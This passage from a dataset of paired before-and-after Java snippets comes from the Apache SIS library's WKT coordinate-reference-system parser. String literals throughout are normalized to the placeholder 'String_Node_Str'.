 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}","/** 
 * Parses a   {@code ""VerticalDatum""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#71"">WKT 2 specification 10.2</a>. The legacy WKT 1 pattern was: {@preformat wkt}VERT_DATUM[""<name>"", <datum type>  ,<authority>}] }
 * @param mode   {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @param isWKT1 {@code true} if the parent is a WKT 1 element.
 * @return The {@code ""VerticalDatum""} element as a {@link VerticalDatum} object.
 * @throws ParseException if the {@code ""VerticalDatum""} element can not be parsed.
 */
private VerticalDatum parseVerticalDatum(final int mode,final Element parent,final boolean isWKT1) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.VerticalDatum,WKTKeywords.VDatum,WKTKeywords.Vert_Datum);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  VerticalDatumType type=null;
  if (isWKT1) {
    type=VerticalDatumTypes.fromLegacy(element.pullInteger(""String_Node_Str""));
  }
  if (type == null) {
    type=VerticalDatumTypes.guess(name,null,null);
  }
  try {
    return datumFactory.createVerticalDatum(parseAnchorAndClose(element,name),type);
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}"
91934,"/** 
 * Parses an optional   {@code ""UNIT""} element of a known dimension.This element has the following pattern: {@preformat text}UNIT[""<name>"", <conversion factor>  ,<authority>}] } Unit was a mandatory element in WKT 1, but became optional in WKT 2 because the unit may be specified in each   {@code AXIS[]} element instead than for the whole coordinate system.
 * @param parent   The parent element.
 * @param keyword  The unit keyword (e.g. {@code ""LengthUnit""} or {@code ""AngleUnit""}).
 * @param baseUnit The base unit, usually {@code SI.METRE} or {@code SI.RADIAN}.
 * @return The {@code ""UNIT""} element as an {@link Unit} object, or {@code null} if none.
 * @throws ParseException if the {@code ""UNIT""} can not be parsed.
 * @todo Authority code is currently ignored. We may consider to create a subclass of{@link Unit} which implements {@link IdentifiedObject} in a future version.
 */
@SuppressWarnings(""String_Node_Str"") private <Q extends Quantity>Unit<Q> parseScaledUnit(final Element parent,final String keyword,final Unit<Q> baseUnit) throws ParseException {
  final Element element=parent.pullElement(OPTIONAL,keyword,WKTKeywords.Unit);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final double factor=element.pullDouble(""String_Node_Str"");
  final Unit<?> unit=parseUnitID(element);
  element.close(ignoredElements);
  if (unit != null) {
    if (baseUnit.toSI().equals(unit.toSI())) {
      return (Unit<Q>)unit;
    }
 else {
      warning(Errors.formatInternational(Errors.Keys.IllegalUnitFor_2,keyword,unit),null);
    }
  }
  return Units.multiply(baseUnit,factor);
}","/** 
 * Parses an optional   {@code ""UNIT""} element of a known dimension.This element has the following pattern: {@preformat wkt}UNIT[""<name>"", <conversion factor>  ,<authority>}] } Unit was a mandatory element in WKT 1, but became optional in WKT 2 because the unit may be specified in each   {@code AXIS[]} element instead than for the whole coordinate system.
 * @param parent   The parent element.
 * @param keyword  The unit keyword (e.g. {@code ""LengthUnit""} or {@code ""AngleUnit""}).
 * @param baseUnit The base unit, usually {@code SI.METRE} or {@code SI.RADIAN}.
 * @return The {@code ""UNIT""} element as an {@link Unit} object, or {@code null} if none.
 * @throws ParseException if the {@code ""UNIT""} can not be parsed.
 * @todo Authority code is currently ignored. We may consider to create a subclass of{@link Unit} which implements {@link IdentifiedObject} in a future version.
 */
@SuppressWarnings(""String_Node_Str"") private <Q extends Quantity>Unit<Q> parseScaledUnit(final Element parent,final String keyword,final Unit<Q> baseUnit) throws ParseException {
  final Element element=parent.pullElement(OPTIONAL,keyword,WKTKeywords.Unit);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final double factor=element.pullDouble(""String_Node_Str"");
  final Unit<?> unit=parseUnitID(element);
  element.close(ignoredElements);
  if (unit != null) {
    if (baseUnit.toSI().equals(unit.toSI())) {
      return (Unit<Q>)unit;
    }
 else {
      warning(parent,element,Errors.formatInternational(Errors.Keys.IllegalUnitFor_2,keyword,unit),null);
    }
  }
  return Units.multiply(baseUnit,factor);
}"
91935,"/** 
 * Parses a   {@code ""TimeDatum""} element. This element has the following pattern:{@preformat text}TimeDatum[""<name>"", TimeOrigin[<time origin>]  ,<authority>}] }
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @return The {@code ""TimeDatum""} element as a {@link TemporalDatum} object.
 * @throws ParseException if the {@code ""TimeDatum""} element can not be parsed.
 */
private TemporalDatum parseTimeDatum(final int mode,final Element parent) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.TimeDatum,WKTKeywords.TDatum);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final Element origin=element.pullElement(MANDATORY,WKTKeywords.TimeOrigin);
  final Date epoch=origin.pullDate(""String_Node_Str"");
  origin.close(ignoredElements);
  try {
    return datumFactory.createTemporalDatum(parseAnchorAndClose(element,name),epoch);
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}","/** 
 * Parses a   {@code ""TimeDatum""} element. This element has the following pattern:{@preformat wkt}TimeDatum[""<name>"", TimeOrigin[<time origin>]  ,<authority>}] }
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @return The {@code ""TimeDatum""} element as a {@link TemporalDatum} object.
 * @throws ParseException if the {@code ""TimeDatum""} element can not be parsed.
 */
private TemporalDatum parseTimeDatum(final int mode,final Element parent) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.TimeDatum,WKTKeywords.TDatum);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final Element origin=element.pullElement(MANDATORY,WKTKeywords.TimeOrigin);
  final Date epoch=origin.pullDate(""String_Node_Str"");
  origin.close(ignoredElements);
  try {
    return datumFactory.createTemporalDatum(parseAnchorAndClose(element,name),epoch);
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}"
91936,"/** 
 * Parses an <strong>optional</strong>   {@code ""TOWGS84""} element.This element is specific to WKT 1 and has the following pattern: {@preformat textTOWGS84[<dx>, <dy>, <dz>, <ex>, <ey>, <ez>, <ppm>]}
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @return The {@code ""TOWGS84""} element as a {@link org.apache.sis.referencing.datum.BursaWolfParameters} object,or  {@code null} if no {@code ""TOWGS84""} has been found.
 * @throws ParseException if the {@code ""TOWGS84""} can not be parsed.
 */
private Object parseToWGS84(final int mode,final Element parent) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.ToWGS84);
  if (element == null) {
    return null;
  }
  final double[] values=new double[ToWGS84.length];
  for (int i=0; i < values.length; ) {
    values[i]=element.pullDouble(ToWGS84[i]);
    if ((++i % 3) == 0 && element.isEmpty()) {
      break;
    }
  }
  element.close(ignoredElements);
  return referencing.createToWGS84(values);
}","/** 
 * Parses an <strong>optional</strong>   {@code ""TOWGS84""} element.This element is specific to WKT 1 and has the following pattern: {@preformat wktTOWGS84[<dx>, <dy>, <dz>, <ex>, <ey>, <ez>, <ppm>]}
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @return The {@code ""TOWGS84""} element as a {@link org.apache.sis.referencing.datum.BursaWolfParameters} object,or  {@code null} if no {@code ""TOWGS84""} has been found.
 * @throws ParseException if the {@code ""TOWGS84""} can not be parsed.
 */
private Object parseToWGS84(final int mode,final Element parent) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.ToWGS84);
  if (element == null) {
    return null;
  }
  final double[] values=new double[ToWGS84.length];
  for (int i=0; i < values.length; ) {
    values[i]=element.pullDouble(ToWGS84[i]);
    if ((++i % 3) == 0 && element.isEmpty()) {
      break;
    }
  }
  element.close(ignoredElements);
  return referencing.createToWGS84(values);
}"
91937,"/** 
 * Parses a   {@code ""Datum""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#54"">WKT 2 specification 8.2.4</a>. The legacy WKT 1 pattern was: {@preformat text}DATUM[""<name>"", <spheroid>  ,<to wgs84>} {,<authority>}] }
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @param meridian the prime meridian, or {@code null} for Greenwich.
 * @return The {@code ""Datum""} element as a {@link GeodeticDatum} object.
 * @throws ParseException if the {@code ""Datum""} element can not be parsed.
 * @see org.apache.sis.referencing.datum.DefaultGeodeticDatum#formatTo(Formatter)
 */
private GeodeticDatum parseDatum(final int mode,final Element parent,PrimeMeridian meridian) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.Datum,WKTKeywords.GeodeticDatum);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final Ellipsoid ellipsoid=parseEllipsoid(MANDATORY,element);
  final Object toWGS84=parseToWGS84(OPTIONAL,element);
  final Map<String,Object> properties=parseAnchorAndClose(element,name);
  if (meridian == null) {
    meridian=referencing.getGreenwich();
  }
  if (toWGS84 != null) {
    properties.put(ReferencingServices.BURSA_WOLF_KEY,toWGS84);
  }
  try {
    return datumFactory.createGeodeticDatum(properties,ellipsoid,meridian);
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}","/** 
 * Parses a   {@code ""Datum""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#54"">WKT 2 specification 8.2.4</a>. The legacy WKT 1 pattern was: {@preformat wkt}DATUM[""<name>"", <spheroid>  ,<to wgs84>} {,<authority>}] }
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @param meridian the prime meridian, or {@code null} for Greenwich.
 * @return The {@code ""Datum""} element as a {@link GeodeticDatum} object.
 * @throws ParseException if the {@code ""Datum""} element can not be parsed.
 * @see org.apache.sis.referencing.datum.DefaultGeodeticDatum#formatTo(Formatter)
 */
private GeodeticDatum parseDatum(final int mode,final Element parent,PrimeMeridian meridian) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.Datum,WKTKeywords.GeodeticDatum);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final Ellipsoid ellipsoid=parseEllipsoid(MANDATORY,element);
  final Object toWGS84=parseToWGS84(OPTIONAL,element);
  final Map<String,Object> properties=parseAnchorAndClose(element,name);
  if (meridian == null) {
    meridian=referencing.getGreenwich();
  }
  if (toWGS84 != null) {
    properties.put(ReferencingServices.BURSA_WOLF_KEY,toWGS84);
  }
  try {
    return datumFactory.createGeodeticDatum(properties,ellipsoid,meridian);
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}"
91938,"/** 
 * Parses a   {@code ""VerticalCRS""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#69"">WKT 2 specification 10</a>. The legacy WKT 1 pattern was: {@preformat text}VERT_CS[""<name>"", <vert datum>, <linear unit>,  <axis>,} {,<authority>}] }
 * @param mode      {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent    The parent element.
 * @param isBaseCRS {@code true} if parsing the CRS inside a {@code DerivedCRS}.
 * @return The {@code ""VerticalCRS""} element as a {@link VerticalCRS} object.
 * @throws ParseException if the {@code ""VerticalCRS""} element can not be parsed.
 */
private SingleCRS parseVerticalCRS(final int mode,final Element parent,final boolean isBaseCRS) throws ParseException {
  final Element element=parent.pullElement(mode,isBaseCRS ? new String[]{WKTKeywords.BaseVertCRS} : new String[]{WKTKeywords.VerticalCRS,WKTKeywords.VertCRS,WKTKeywords.Vert_CS});
  if (element == null) {
    return null;
  }
  final boolean isWKT1=element.getKeywordIndex() == 2;
  final String name=element.pullString(""String_Node_Str"");
  final Unit<?> unit=parseUnit(element);
  VerticalDatum datum=null;
  SingleCRS baseCRS=null;
  Conversion fromBase=null;
  if (!isWKT1 && !isBaseCRS) {
    fromBase=parseDerivingConversion(OPTIONAL,element,WKTKeywords.DerivingConversion,unit,null);
    if (fromBase != null) {
      baseCRS=parseVerticalCRS(MANDATORY,element,true);
    }
  }
  if (baseCRS == null) {
    datum=parseVerticalDatum(MANDATORY,element,isWKT1);
  }
  final CoordinateSystem cs;
  try {
    cs=parseCoordinateSystem(element,WKTKeywords.vertical,1,isWKT1,unit,datum);
    final Map<String,?> properties=parseMetadataAndClose(element,name,datum);
    if (cs instanceof VerticalCS) {
      if (baseCRS != null) {
        return crsFactory.createDerivedCRS(properties,baseCRS,fromBase,cs);
      }
      if (VerticalDatumType.OTHER_SURFACE.equals(datum.getVerticalDatumType())) {
        final VerticalDatumType type=VerticalDatumTypes.guess(datum.getName().getCode(),datum.getAlias(),cs.getAxis(0));
        if (!VerticalDatumType.OTHER_SURFACE.equals(type)) {
          datum=datumFactory.createVerticalDatum(referencing.getProperties(datum),type);
        }
      }
      verticalCRS=crsFactory.createVerticalCRS(properties,datum,(VerticalCS)cs);
      if (verticalElements != null) {
        verticalElements=verticalElements.resolve(verticalCRS);
      }
      return verticalCRS;
    }
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
  throw element.illegalCS(cs);
}","/** 
 * Parses a   {@code ""VerticalCRS""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#69"">WKT 2 specification 10</a>. The legacy WKT 1 pattern was: {@preformat wkt}VERT_CS[""<name>"", <vert datum>, <linear unit>,  <axis>,} {,<authority>}] }
 * @param mode      {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent    The parent element.
 * @param isBaseCRS {@code true} if parsing the CRS inside a {@code DerivedCRS}.
 * @return The {@code ""VerticalCRS""} element as a {@link VerticalCRS} object.
 * @throws ParseException if the {@code ""VerticalCRS""} element can not be parsed.
 */
private SingleCRS parseVerticalCRS(final int mode,final Element parent,final boolean isBaseCRS) throws ParseException {
  final Element element=parent.pullElement(mode,isBaseCRS ? new String[]{WKTKeywords.BaseVertCRS} : new String[]{WKTKeywords.VerticalCRS,WKTKeywords.VertCRS,WKTKeywords.Vert_CS});
  if (element == null) {
    return null;
  }
  final boolean isWKT1=element.getKeywordIndex() == 2;
  final String name=element.pullString(""String_Node_Str"");
  final Unit<?> unit=parseUnit(element);
  VerticalDatum datum=null;
  SingleCRS baseCRS=null;
  Conversion fromBase=null;
  if (!isWKT1 && !isBaseCRS) {
    fromBase=parseDerivingConversion(OPTIONAL,element,WKTKeywords.DerivingConversion,unit,null);
    if (fromBase != null) {
      baseCRS=parseVerticalCRS(MANDATORY,element,true);
    }
  }
  if (baseCRS == null) {
    datum=parseVerticalDatum(MANDATORY,element,isWKT1);
  }
  final CoordinateSystem cs;
  try {
    cs=parseCoordinateSystem(element,WKTKeywords.vertical,1,isWKT1,unit,datum);
    final Map<String,?> properties=parseMetadataAndClose(element,name,datum);
    if (cs instanceof VerticalCS) {
      if (baseCRS != null) {
        return crsFactory.createDerivedCRS(properties,baseCRS,fromBase,cs);
      }
      if (VerticalDatumType.OTHER_SURFACE.equals(datum.getVerticalDatumType())) {
        final VerticalDatumType type=VerticalDatumTypes.guess(datum.getName().getCode(),datum.getAlias(),cs.getAxis(0));
        if (!VerticalDatumType.OTHER_SURFACE.equals(type)) {
          datum=datumFactory.createVerticalDatum(referencing.getProperties(datum),type);
        }
      }
      verticalCRS=crsFactory.createVerticalCRS(properties,datum,(VerticalCS)cs);
      if (verticalElements != null) {
        verticalElements=verticalElements.resolve(verticalCRS);
      }
      return verticalCRS;
    }
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
  throw element.illegalCS(cs);
}"
91939,"/** 
 * Parses a   {@code ""CompoundCRS""} element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#110"">WKT 2 specification 16</a>. The legacy WKT 1 specification was: {@preformat text}COMPD_CS[""<name>"", <head cs>, <tail cs>  ,<authority>}] }
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @return The {@code ""CompoundCRS""} element as a {@link CompoundCRS} object.
 * @throws ParseException if the {@code ""CompoundCRS""} element can not be parsed.
 */
private CompoundCRS parseCompoundCRS(final int mode,final Element parent) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.CompoundCRS,WKTKeywords.Compd_CS);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  CoordinateReferenceSystem crs;
  final List<CoordinateReferenceSystem> components=new ArrayList<>(4);
  while ((crs=parseCoordinateReferenceSystem(element,components.size() < 2)) != null) {
    components.add(crs);
  }
  try {
    return crsFactory.createCompoundCRS(parseMetadataAndClose(element,name,null),components.toArray(new CoordinateReferenceSystem[components.size()]));
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}","/** 
 * Parses a   {@code ""CompoundCRS""} element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#110"">WKT 2 specification 16</a>. The legacy WKT 1 specification was: {@preformat wkt}COMPD_CS[""<name>"", <head cs>, <tail cs>  ,<authority>}] }
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @return The {@code ""CompoundCRS""} element as a {@link CompoundCRS} object.
 * @throws ParseException if the {@code ""CompoundCRS""} element can not be parsed.
 */
private CompoundCRS parseCompoundCRS(final int mode,final Element parent) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.CompoundCRS,WKTKeywords.Compd_CS);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  CoordinateReferenceSystem crs;
  final List<CoordinateReferenceSystem> components=new ArrayList<>(4);
  while ((crs=parseCoordinateReferenceSystem(element,components.size() < 2)) != null) {
    components.add(crs);
  }
  try {
    return crsFactory.createCompoundCRS(parseMetadataAndClose(element,name,null),components.toArray(new CoordinateReferenceSystem[components.size()]));
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}"
91940,"/** 
 * Parses the   {@code ID[""authority"", ""code""]} element inside a {@code UNIT} element.If such element is found, the authority is  {@code ""EPSG""} and the code is one ofthe codes known to the  {@link Units#valueOfEPSG(int)}, then that unit is returned. Otherwise this method returns null. <div class=""note""><b>Note:</b> this method is a slight departure of ISO 19162, which said <cite>""Should any attributes or values given in the cited identifier be in conflict with attributes or values given explicitly in the WKT description, the WKT values shall prevail.""</cite> But some units can hardly be expressed by the   {@code UNIT} element,because the later can contain only a conversion factor. For example sexagesimal units (EPSG:9108, 9110 and 9111) can hardly be expressed in an other way than by their EPSG code. Thankfully, identifiers in {@code UNIT} elements are rare, so risk of conflicts should be low.</div>
 * @param parent The parent {@code ""UNIT""} element.
 * @return The unit from the identifier code, or {@code null} if none.
 * @throws ParseException if the {@code ""ID""} can not be parsed.
 */
final Unit<?> parseUnitID(final Element parent) throws ParseException {
  final Element element=parent.pullElement(OPTIONAL,ID_KEYWORDS);
  if (element != null) {
    final String codeSpace=element.pullString(""String_Node_Str"");
    final Object code=element.pullObject(""String_Node_Str"");
    element.close(ignoredElements);
    if (Constants.EPSG.equalsIgnoreCase(codeSpace))     try {
      final int n;
      if (Numbers.isInteger(code.getClass())) {
        n=((Number)code).intValue();
      }
 else {
        n=Integer.parseInt(code.toString());
      }
      return Units.valueOfEPSG(n);
    }
 catch (    NumberFormatException e) {
      warning(parent,element,e);
    }
  }
  return null;
}","/** 
 * Parses the   {@code ID[""authority"", ""code""]} element inside a {@code UNIT} element.If such element is found, the authority is  {@code ""EPSG""} and the code is one ofthe codes known to the  {@link Units#valueOfEPSG(int)}, then that unit is returned. Otherwise this method returns null. <div class=""note""><b>Note:</b> this method is a slight departure of ISO 19162, which said <cite>""Should any attributes or values given in the cited identifier be in conflict with attributes or values given explicitly in the WKT description, the WKT values shall prevail.""</cite> But some units can hardly be expressed by the   {@code UNIT} element,because the later can contain only a conversion factor. For example sexagesimal units (EPSG:9108, 9110 and 9111) can hardly be expressed in an other way than by their EPSG code. Thankfully, identifiers in {@code UNIT} elements are rare, so risk of conflicts should be low.</div>
 * @param parent The parent {@code ""UNIT""} element.
 * @return The unit from the identifier code, or {@code null} if none.
 * @throws ParseException if the {@code ""ID""} can not be parsed.
 */
final Unit<?> parseUnitID(final Element parent) throws ParseException {
  final Element element=parent.pullElement(OPTIONAL,ID_KEYWORDS);
  if (element != null) {
    final String codeSpace=element.pullString(""String_Node_Str"");
    final Object code=element.pullObject(""String_Node_Str"");
    element.close(ignoredElements);
    if (Constants.EPSG.equalsIgnoreCase(codeSpace))     try {
      final int n;
      if (Numbers.isInteger(code.getClass())) {
        n=((Number)code).intValue();
      }
 else {
        n=Integer.parseInt(code.toString());
      }
      return Units.valueOfEPSG(n);
    }
 catch (    NumberFormatException e) {
      warning(parent,element,null,e);
    }
  }
  return null;
}"
91941,"/** 
 * Removes the next   {@link Object} from the list and returns it.
 * @param key The parameter name. Used for formatting an error message if no number is found.
 * @return The next {@link Object} on the list (never {@code null}).
 * @throws ParseException if no more object is available.
 */
public Object pullObject(final String key) throws ParseException {
  final Iterator<Object> iterator=list.iterator();
  while (iterator.hasNext()) {
    final Object object=iterator.next();
    if (object != null) {
      iterator.remove();
      return object;
    }
  }
  throw missingComponent(key);
}","/** 
 * Removes the next   {@link Object} from the list and returns it.
 * @param key The parameter name. Used for formatting an error message if no number is found.
 * @return The next {@link Object} on the list (never {@code null}).
 * @throws ParseException if no more object is available.
 */
public Object pullObject(final String key) throws ParseException {
  final Iterator<Object> iterator=list.iterator();
  while (iterator.hasNext()) {
    final Object object=iterator.next();
    if (object != null && !(object instanceof Element)) {
      iterator.remove();
      return object;
    }
  }
  throw missingComponent(key);
}"
91942,"/** 
 * Removes the next object of the given type from the list and returns it, if presents.
 * @param type The object type.
 * @return The next object on the list, or {@code null} if none.
 */
@SuppressWarnings(""String_Node_Str"") public <T>T pullOptional(final Class<T> type){
  final Iterator<Object> iterator=list.iterator();
  while (iterator.hasNext()) {
    final Object object=iterator.next();
    if (type.isInstance(object)) {
      iterator.remove();
      return (T)object;
    }
  }
  return null;
}","/** 
 * Removes the next object of the given type from the list and returns it, if presents.
 * @param type The object type.
 * @return The next object on the list, or {@code null} if none.
 */
@SuppressWarnings(""String_Node_Str"") public <T>T pullOptional(final Class<T> type){
  final Iterator<Object> iterator=list.iterator();
  while (iterator.hasNext()) {
    final Object object=iterator.next();
    if (type.isInstance(object) && !(object instanceof Element)) {
      iterator.remove();
      return (T)object;
    }
  }
  return null;
}"
91943,"/** 
 * Tests the parsing of a projected CRS using angular values in grades instead than degrees and in lengths in kilometres instead than metres.
 * @throws ParseException if the parsing failed.
 */
@Test @DependsOnMethod({""String_Node_Str"",""String_Node_Str""}) public void testProjectedWithGradUnits() throws ParseException {
  String wkt=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"";
  ProjectedCRS crs=parse(ProjectedCRS.class,wkt);
  assertNameAndIdentifierEqual(""String_Node_Str"",0,crs);
  verifyProjectedCS(crs.getCoordinateSystem(),SI.KILOMETRE);
  PrimeMeridian pm=verifyNTF(crs.getDatum(),true);
  assertEquals(""String_Node_Str"",NonSI.GRADE,pm.getAngularUnit());
  assertEquals(""String_Node_Str"",2.5969213,pm.getGreenwichLongitude(),STRICT);
  ParameterValue<?> param=verifyNTF(crs.getConversionFromBase().getParameterValues());
  assertEquals(""String_Node_Str"",NonSI.GRADE,param.getUnit());
  assertEquals(""String_Node_Str"",52.0,param.doubleValue(),STRICT);
  wkt=wkt.replace(""String_Node_Str"",""String_Node_Str"");
  wkt=wkt.replace(""String_Node_Str"",""String_Node_Str"");
  wkt=wkt.replace(""String_Node_Str"",""String_Node_Str"");
  wkt=wkt.replace(""String_Node_Str"",""String_Node_Str"");
  newParser(Convention.WKT1_IGNORE_AXES);
  crs=parse(ProjectedCRS.class,wkt);
  assertNameAndIdentifierEqual(""String_Node_Str"",0,crs);
  verifyProjectedCS(crs.getCoordinateSystem(),SI.KILOMETRE);
  pm=verifyNTF(crs.getDatum(),true);
  assertEquals(""String_Node_Str"",NonSI.DEGREE_ANGLE,pm.getAngularUnit());
  assertEquals(""String_Node_Str"",2.33722917,pm.getGreenwichLongitude(),STRICT);
  param=verifyNTF(crs.getConversionFromBase().getParameterValues());
  assertEquals(""String_Node_Str"",NonSI.DEGREE_ANGLE,param.getUnit());
  assertEquals(""String_Node_Str"",46.8,param.doubleValue(),STRICT);
}","/** 
 * Tests the parsing of a projected CRS using angular values in grades instead than degrees and in lengths in kilometres instead than metres.
 * @throws ParseException if the parsing failed.
 */
@Test @DependsOnMethod({""String_Node_Str"",""String_Node_Str""}) public void testProjectedWithGradUnits() throws ParseException {
  String wkt=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"";
  validateParisFranceII(parse(ProjectedCRS.class,wkt),0,true);
  wkt=wkt.replace(""String_Node_Str"",""String_Node_Str"");
  wkt=wkt.replace(""String_Node_Str"",""String_Node_Str"");
  wkt=wkt.replace(""String_Node_Str"",""String_Node_Str"");
  wkt=wkt.replace(""String_Node_Str"",""String_Node_Str"");
  newParser(Convention.WKT1_IGNORE_AXES);
  final ProjectedCRS crs=parse(ProjectedCRS.class,wkt);
  assertNameAndIdentifierEqual(""String_Node_Str"",0,crs);
  verifyProjectedCS(crs.getCoordinateSystem(),SI.KILOMETRE);
  final PrimeMeridian pm=verifyNTF(crs.getDatum(),true);
  assertEquals(""String_Node_Str"",NonSI.DEGREE_ANGLE,pm.getAngularUnit());
  assertEquals(""String_Node_Str"",2.33722917,pm.getGreenwichLongitude(),STRICT);
  final ParameterValue<?> param=verifyNTF(crs.getConversionFromBase().getParameterValues());
  assertEquals(""String_Node_Str"",NonSI.DEGREE_ANGLE,param.getUnit());
  assertEquals(""String_Node_Str"",46.8,param.doubleValue(),STRICT);
}"
91944,"/** 
 * Parses the given symbol. This method is similar to   {@link Unit#valueOf(CharSequence)}, but hands especially a few symbols found in WKT parsing or in XML files. The list of symbols handled especially is implementation-dependent and may change in future SIS versions. <div class=""section"">Parsing authority codes</div> As a special case, if the given   {@code uom} arguments is of the form {@code ""EPSG:####""}or   {@code ""urn:ogc:def:uom:EPSG:####""} (ignoring case and whitespaces), then {@code ""####""}is parsed as an integer and forwarded to the   {@link #valueOfEPSG(int)} method.<div class=""section"">NetCDF unit symbols</div> The attributes in NetCDF files often merge the axis direction with the angular unit, as in  {@code ""degrees_east""} or {@code ""degrees_north""}. This   {@code valueOf} methodignores those suffixes and unconditionally returns  {@link NonSI#DEGREE_ANGLE} for allaxis directions. In particular, the units for  {@code ""degrees_west""} and {@code ""degrees_east""}do <strong>not</strong> have opposite sign. It is caller responsibility to handle the direction of axes associated to NetCDF units.
 * @param uom The symbol to parse, or {@code null}.
 * @return The parsed symbol, or {@code null} if {@code uom} was null.
 * @throws IllegalArgumentException if the given symbol can not be parsed.
 */
public static Unit<?> valueOf(String uom) throws IllegalArgumentException {
  if (uom == null) {
    return null;
  }
  uom=trimWhitespaces(CharSequences.toASCII(uom)).toString();
  final int length=uom.length();
  if (isURI(uom)) {
    String code=DefinitionURI.codeOf(""String_Node_Str"",Constants.EPSG,uom);
    if (code != null && code != uom)     try {
      return valueOfEPSG(Integer.parseInt(code));
    }
 catch (    NumberFormatException e) {
      throw new IllegalArgumentException(Errors.format(Errors.Keys.IllegalArgumentValue_2,""String_Node_Str"",uom),e);
    }
    code=XPaths.xpointer(""String_Node_Str"",uom);
    if (code != null) {
      uom=code;
    }
  }
  if (uom.regionMatches(true,0,""String_Node_Str"",0,3)) {
switch (length) {
case 3:
      return NonSI.DEGREE_ANGLE;
case 4:
{
      if (uom.charAt(3) == 'K') {
        return SI.KELVIN;
      }
      break;
    }
}
String prefix=uom;
boolean isTemperature=false;
final int s=Math.max(uom.lastIndexOf(' '),uom.lastIndexOf('_'));
if (s >= 1) {
  final String suffix=(String)trimWhitespaces(uom,s + 1,length);
  if (ArraysExt.containsIgnoreCase(CARDINAL_DIRECTIONS,suffix) || (isTemperature=isCelsius(suffix))) {
    prefix=(String)trimWhitespaces(uom,0,s);
  }
}
if (equalsIgnorePlural(prefix,""String_Node_Str"")) {
  return isTemperature ? SI.CELSIUS : NonSI.DEGREE_ANGLE;
}
}
 else {
if (uom.equals(""String_Node_Str"") || equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.DEGREE_ANGLE;
if (uom.equalsIgnoreCase(""String_Node_Str"")) return NonSI.SECOND_ANGLE;
if (uom.equalsIgnoreCase(""String_Node_Str"") || equalsIgnorePlural(uom,""String_Node_Str"")) return SI.RADIAN;
if (equalsIgnorePlural(uom,""String_Node_Str"") || equalsIgnorePlural(uom,""String_Node_Str"")) return SI.KILOMETRE;
if (equalsIgnorePlural(uom,""String_Node_Str"") || equalsIgnorePlural(uom,""String_Node_Str"")) return SI.METRE;
if (equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.WEEK;
